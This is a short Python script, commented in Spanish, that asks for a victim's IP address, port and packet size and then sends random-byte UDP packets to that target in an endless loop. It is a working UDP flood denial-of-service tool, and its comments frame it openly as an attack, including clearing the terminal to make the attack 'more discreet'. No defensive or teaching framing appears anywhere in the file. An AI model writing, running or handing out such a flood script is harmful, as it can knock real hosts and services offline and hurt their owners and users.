import random
import socket
import os

# Importo las herramientas necesarias: random para aleatorizar los bytes a enviar,
# socket para crear el socket de conexión UDP,
# y os para averiguar el sistema operativo y limpiar la terminal.

# Limpio la terminal para que el ataque sea más discreto.
os.system("cls" if os.name == "nt" else "clear")

# Creo un socket UDP para poder establecer una conexión.
connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Solicito al usuario la IP víctima y elimino posibles espacios accidentales.
print("Ingresa la IP de la víctima por favor")
ip = input("IP>").strip()

# Solicito al usuario la cantidad de bytes para el ataque.
size_attack = int(input("Por favor ingresa un número de bytes que deseas enviar a la víctima: "))

# Solicito al usuario el puerto víctima.
print("Introduce el puerto de la víctima por favor")
port = int(input("PUERTO>"))

# Añado algunas líneas innecesarias.
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")
print("Preparando el ataque...")

# Lanzo el ataque en la parte principal del programa controlando posibles errores de red.
while True:
    try:
        connect.sendto(bytes(random.randint(0, 255) for _ in range(size_attack)), (ip, port))
        print("Ataque enviado correctamente")
    except socket.gaierror:
        print("Error: La dirección IP introducida no es válida o no se puede resolver.")
        break
    except KeyboardInterrupt:
        print("Cancelado por el usuario")
        break
